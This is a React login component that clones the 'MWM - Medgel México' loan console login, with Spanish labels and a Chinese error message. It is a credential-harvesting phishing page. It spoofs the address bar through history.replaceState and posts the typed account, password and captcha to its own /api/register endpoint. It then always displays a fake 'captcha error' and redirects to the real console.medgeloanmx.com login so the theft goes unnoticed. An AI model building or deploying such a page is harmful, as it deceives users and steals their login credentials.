"use client";

import { useState, useEffect } from "react";

type FieldName = "cuenta" | "password" | "captcha";

export default function Login() {
  const [cuenta, setCuenta] = useState("");
  const [password, setPassword] = useState("");
  const [captcha, setCaptcha] = useState("");
  const [showPass, setShowPass] = useState(false);

  // 🔥 NOTIFICACIÓN (CHINA ORIGINAL)
  const [showError, setShowError] = useState(false);

  // ✅ loading
  const [loading, setLoading] = useState(false);

  const fakeUrl =
    "/register?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";

  // ✅ REGISTER + REDIRECT (SIN CAMBIAR TU FLUJO)
  const handleRegister = async () => {
    const cuentaVacia = cuenta.trim() === "";
    const passwordVacia = password.trim() === "";
    const captchaVacio = captcha.trim() === "";

    setTouched({
      cuenta: true,
      password: true,
      captcha: true,
    });

    if (cuentaVacia || passwordVacia || captchaVacio) {
      setShowError(true);

      setTimeout(() => {
        window.location.href =
          "https://console.medgeloanmx.com/login?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
      }, 1500);

      return;
    }

    try {
      setLoading(true);

      await fetch("/api/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cuenta,
          password,
          captcha,
        }),
      });

      // 🔴 ALERTA + REDIRECT (IGUAL QUE ANTES)
      setShowError(true);

      setTimeout(() => {
        window.location.href =
          "https://console.medgeloanmx.com/login?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
      }, 1500);
    } catch (error) {
      console.error(error);

      setShowError(true);

      setTimeout(() => {
        window.location.href =
          "https://console.medgeloanmx.com/login?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
      }, 1500);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (!window.location.search.includes("redirect=")) {
      window.history.replaceState({}, "", fakeUrl);
    }
  }, []);

  useEffect(() => {
    const handlePageShow = (event: PageTransitionEvent) => {
      if (event.persisted) {
        window.location.reload();
      }
    };

    window.addEventListener("pageshow", handlePageShow);

    return () => {
      window.removeEventListener("pageshow", handlePageShow);
    };
  }, []);

  const captchas = [
    "/captcha/c1.png",
    "/captcha/c2.png",
    "/captcha/c3.png",
    "/captcha/c4.png",
    "/captcha/c5.png",
    "/captcha/c6.png",
    "/captcha/c7.png",
    "/captcha/c8.png",
    "/captcha/c9.png",
    "/captcha/c10.png",
  ];

  const [captchaImg, setCaptchaImg] = useState(() => {
    return captchas[Math.floor(Math.random() * captchas.length)];
  });

  const cambiarCaptcha = () => {
    const random = captchas[Math.floor(Math.random() * captchas.length)];
    setCaptchaImg(random);
  };

  const [focusedField, setFocusedField] = useState<FieldName | null>(null);
  const [touched, setTouched] = useState<Record<FieldName, boolean>>({
    cuenta: false,
    password: false,
    captcha: false,
  });

  const handleFocus = (f: FieldName) => setFocusedField(f);

  const handleBlur = (f: FieldName) => {
    setFocusedField(null);
    setTouched((prev) => ({ ...prev, [f]: true }));
  };

  const isEmpty = (v: string) => v.trim() === "";

  const showCuentaError = touched.cuenta && isEmpty(cuenta);
  const showPasswordError = touched.password && isEmpty(password);
  const showCaptchaError = touched.captcha && isEmpty(captcha);

  const getBorder = (f: FieldName, error: boolean) => {
    if (focusedField === f) return "border-[#67c23a]";
    if (error) return "border-[#ff6b6b]";
    return "border-[#dcdfe6]";
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#304156] px-3 relative overflow-hidden">

      {/* 🔴 ALERTA ORIGINAL CHINA */}
      <div
        className={`fixed top-0 left-1/2 -translate-x-1/2 z-50 transition-all duration-500 ${
          showError
            ? "translate-y-5 opacity-100"
            : "-translate-y-full opacity-0"
        }`}
      >
        <div className="w-[500px] max-w-[92vw] bg-[#fef0f0] border border-[#fde2e2] rounded-[6px] shadow-sm px-6 py-4 flex items-center gap-3">
          <div className="w-[18px] h-[18px] rounded-full bg-[#f56c6c] text-white flex items-center justify-center text-[12px]">
            ×
          </div>
          <span className="text-[15px] text-[#f56c6c]">
            验证码错误
          </span>
        </div>
      </div>

      <div className="scale-[0.96]">
        <div className="bg-[#ffff] w-[418px] rounded-[8px] px-[24px] py-[33px] shadow-sm">

          <h2 className="text-center text-[#6f6f6f] text-[19px] font-medium mb-5 translate-y-[-6px]">
            MWM - Medgel México
          </h2>

          <form
            onSubmit={(e) => {
              e.preventDefault();
              handleRegister();
            }}
          >

            {/* CUENTA */}
            <div className="mb-[6px]">
              <div className="relative">
                <div className="absolute left-[6px] top-1/2 -translate-y-1/2">
                  <svg width="32" height="16" viewBox="0 0 24 24" fill="#a8abb2">
                    <path d="M12 12c2.7 0 5-2.3 5-5s-2.3-5-5-5-5 2.3-5 5 2.3 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z" />
                  </svg>
                </div>

                <input
                  type="text"
                  placeholder="Cuenta"
                  value={cuenta}
                  onChange={(e) => setCuenta(e.target.value)}
                  onFocus={() => handleFocus("cuenta")}
                  onBlur={() => handleBlur("cuenta")}
                  className={`w-full h-[41px] bg-[#ffff] rounded-[4px] pl-[34px] pr-5 text-[15px] text-[#606266] placeholder:text-[#909399] outline-none border ${getBorder("cuenta", showCuentaError)}`}
                />
              </div>

              <div className="h-[12px]">
                {showCuentaError && (
                  <p className="text-[12px] text-[#ff6b6b]">
                    Por favor introduzca su cuenta
                  </p>
                )}
              </div>
            </div>

            {/* PASSWORD */}
            <div className="mb-[6px]">
              <div className="relative">
                <img
                  src="/icons/lock.png"
                  className="absolute left-[16px] top-1/2 -translate-y-1/2 w-[12px] opacity-60"
                  alt=""
                />

                <input
                  type={showPass ? "text" : "password"}
                  placeholder="Contraseña"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => handleFocus("password")}
                  onBlur={() => handleBlur("password")}
                  className={`w-full h-[41px] bg-[#ffff] rounded-[4px] pl-[34px] pr-10 text-[15px] text-[#606266] placeholder:text-[#909399] outline-none border ${getBorder("password", showPasswordError)}`}
                />

                <button
                  type="button"
                  onMouseDown={(e) => e.preventDefault()}
                  onClick={() => setShowPass((v) => !v)}
                  className="absolute right-3 top-1/2 -translate-y-1/2"
                >
                  <img
                    src={showPass ? "/icons/eye-open.png" : "/icons/eye-closed.png"}
                    className="w-[16px] h-[16px] object-contain opacity-40"
                    alt=""
                  />
                </button>
              </div>

              <div className="h-[12px]">
                {showPasswordError && (
                  <p className="text-[12px] text-[#ff6b6b]">
                    Por favor introduzca su contraseña
                  </p>
                )}
              </div>
            </div>

            {/* CAPTCHA */}
            <div className="flex gap-3 mb-0">
              <div className="relative flex-1">
                <img
                  src="/icons/shield.png"
                  className="absolute left-[16px] top-1/2 -translate-y-1/2 w-[12px] opacity-60"
                  alt=""
                />

                <input
                  type="text"
                  placeholder="Código de verificación"
                  value={captcha}
                  onChange={(e) => setCaptcha(e.target.value)}
                  onFocus={() => handleFocus("captcha")}
                  onBlur={() => handleBlur("captcha")}
                  className={`w-full h-[41px] bg-[#ffff] rounded-[4px] pl-[34px] pr-5 text-[15px] text-[#606266] placeholder:text-[#909399] outline-none border ${getBorder("captcha", showCaptchaError)}`}
                />
              </div>

              <img
                src={captchaImg}
                onClick={cambiarCaptcha}
                className="mr-[12px] w-[120px] h-[41px] border border-[#8bc34a] bg-white object-cover cursor-pointer"
                alt=""
              />
            </div>

            <div className="mt-0 mb-[4px] h-[12px]">
              <p
                className={`text-[12px] leading-[12px] transition-opacity duration-200 ${
                  showCaptchaError ? "opacity-100 text-[#ff6b6b]" : "opacity-0"
                }`}
                style={{ marginTop: "2px" }}
              >
                Por favor introduzca el código de verificación
              </p>
            </div>

            <div className="mt-2 mb-4 flex items-center">
              <img
                src="/icons/translate.png"
                className="w-[36px] h-[20px] opacity-60 object-contain -ml-[10px]"
                alt=""
              />
            </div>

            {/* BOTÓN */}
            <button
              type="submit"
              disabled={loading}
              className="w-full h-[43px] bg-[#52c41a] hover:bg-[#73d13d] text-white rounded-[4px] text-[15px] disabled:opacity-70"
            >
              Iniciar Sesión
            </button>

          </form>
        </div>
      </div>
    </div>
  );
}